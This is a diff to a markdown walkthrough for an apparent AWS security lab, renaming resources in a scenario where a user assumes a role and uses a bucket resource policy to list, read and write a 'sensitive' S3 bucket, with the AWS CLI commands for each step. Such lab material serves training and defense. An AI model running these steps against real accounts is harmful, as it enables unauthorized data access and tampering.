@@ -8,9 +8,9 @@ This configuration appears in real environments when teams manage S3 access thro
 
 ## The Challenge
 
-You start as `pl-pathfinding-starting-user-prod` — an IAM user with permission to assume the `pl-bucket-access-role`. That role looks completely innocuous: its IAM identity policy grants only `s3:ListAllMyBuckets` on `*`. On the surface it has no bucket access at all.
+You start as `pl-prod-rpb-to-bucket-starting-user` — an IAM user with permission to assume the `pl-bucket-access-role`. That role looks completely innocuous: its IAM identity policy grants only `s3:ListAllMyBuckets` on `*`. On the surface it has no bucket access at all.
 
-Your target is the `pl-sensitive-data-bucket-{account_id}` S3 bucket. The twist is that the bucket's resource policy explicitly names `pl-bucket-access-role` as a principal and grants it `s3:ListBucket`, `s3:GetObject`, `s3:PutObject`, and `s3:DeleteObject`. AWS evaluates identity policies and resource policies independently — if the resource policy grants access and nothing explicitly denies it, the action is permitted regardless of what the IAM identity policy says.
+Your target is the `pl-sensitive-data-{account_id}-{suffix}` S3 bucket. The twist is that the bucket's resource policy explicitly names `pl-bucket-access-role` as a principal and grants it `s3:ListBucket`, `s3:GetObject`, `s3:PutObject`, and `s3:DeleteObject`. AWS evaluates identity policies and resource policies independently — if the resource policy grants access and nothing explicitly denies it, the action is permitted regardless of what the IAM identity policy says.
 
 You need to find the role, assume it, and then leverage the bucket's own policy to read (and write) its contents.
 
@@ -22,7 +22,7 @@ First, verify your starting identity and get the account ID:
 aws sts get-caller-identity --output json
 ```
 
-With `iam:ListRoles` available, enumerate roles in the account and look for anything that references S3 or buckets:
+With `iam:ListRoles` available (the starting user's helpful recon permissions), enumerate roles in the account and look for anything that references S3 or buckets:
 
 ```bash
 aws iam list-roles --output json | jq -r '.Roles[].RoleName'
@@ -38,7 +38,7 @@ If you also have `s3:GetBucketPolicy`, list all buckets and inspect their resour
 
 ```bash
 aws s3api list-buckets --output json
-aws s3api get-bucket-policy --bucket pl-sensitive-data-bucket-{account_id} --output json
+aws s3api get-bucket-policy --bucket pl-sensitive-data-{account_id}-{suffix} --output json
 ```
 
 When you read the bucket policy you'll see the `AllowBucketAccessRole` statement — that's your way in.
@@ -68,25 +68,25 @@ Now as the assumed role, list all buckets using the IAM identity policy permissi
 aws s3api list-buckets --output json
 ```
 
-You'll see `pl-sensitive-data-bucket-{account_id}` in the output. The IAM identity policy only grants `s3:ListAllMyBuckets` — that alone would not let you list or read objects in a specific bucket. But the bucket's resource policy changes the equation.
+You'll see `pl-sensitive-data-{account_id}-{suffix}` in the output. The IAM identity policy only grants `s3:ListAllMyBuckets` — that alone would not let you list or read objects in a specific bucket. But the bucket's resource policy changes the equation.
 
 List objects in the sensitive bucket (permitted via the resource policy, not the IAM policy):
 
 ```bash
-aws s3 ls s3://pl-sensitive-data-bucket-{account_id}/
+aws s3 ls s3://pl-sensitive-data-{account_id}-{suffix}/
 ```
 
 Read a sensitive file:
 
 ```bash
-aws s3 cp s3://pl-sensitive-data-bucket-{account_id}/sensitive-data.txt -
+aws s3 cp s3://pl-sensitive-data-{account_id}-{suffix}/sensitive-data-1.txt -
 ```
 
 Test write access:
 
 ```bash
 echo "attacker was here" > /tmp/test.txt
-aws s3 cp /tmp/test.txt s3://pl-sensitive-data-bucket-{account_id}/attacker-file.txt
+aws s3 cp /tmp/test.txt s3://pl-sensitive-data-{account_id}-{suffix}/attacker-file.txt
 ```
 
 ## Verification
